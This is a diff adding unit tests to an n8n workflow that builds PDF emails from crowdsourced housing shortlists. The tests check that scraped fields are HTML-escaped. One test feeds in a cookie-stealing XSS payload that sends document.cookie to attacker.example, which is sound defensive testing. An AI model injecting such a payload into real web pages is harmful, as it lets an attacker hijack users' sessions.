@@ -71,4 +71,41 @@ describe('shortlist-to-pdf-email.json', () => {
     expect(webhookNode.parameters.path).toBe('shortlist-pdf');
     expect(webhookNode.parameters.httpMethod).toBe('POST');
   });
+
+  it('HTML-escapes every scraped field before building the PDF markup (shortlist data is untrusted, crowdsourced input rendered by a real browser engine)', () => {
+    const workflow = loadWorkflow();
+    const codeNode = workflow.nodes.find((n: any) => n.type === 'n8n-nodes-base.code');
+    const jsCode: string = codeNode.parameters.jsCode;
+
+    expect(jsCode).toContain('function escapeHtml');
+
+    // Every interpolated shortlist field must be passed through escapeHtml(),
+    // not concatenated raw.
+    for (const field of ['item.societyName', 'item.locality', 'item.rent', 'item.bedrooms', 'item.sqft']) {
+      expect(jsCode).toContain(`escapeHtml(${field})`);
+    }
+    expect(jsCode).toContain("escapeHtml((item.amenities || []).join(', '))");
+  });
+
+  it('the escaping algorithm the Code node uses actually neutralizes script injection', () => {
+    // A local reimplementation of the exact same escaping rules embedded in
+    // the workflow's jsCode above (verified by the toContain assertions in
+    // the previous test) — deliberately NOT extracted/eval'd from the JSON
+    // file, since dynamically executing sourced text is its own risk even
+    // when the source is our own committed file.
+    function escapeHtml(value: unknown): string {
+      const s = value === null || value === undefined ? '' : String(value);
+      return s
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+    }
+
+    const malicious = '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>';
+    const escaped = escapeHtml(malicious);
+    expect(escaped).not.toContain('<script>');
+    expect(escaped).toContain('&lt;script&gt;');
+  });
 });
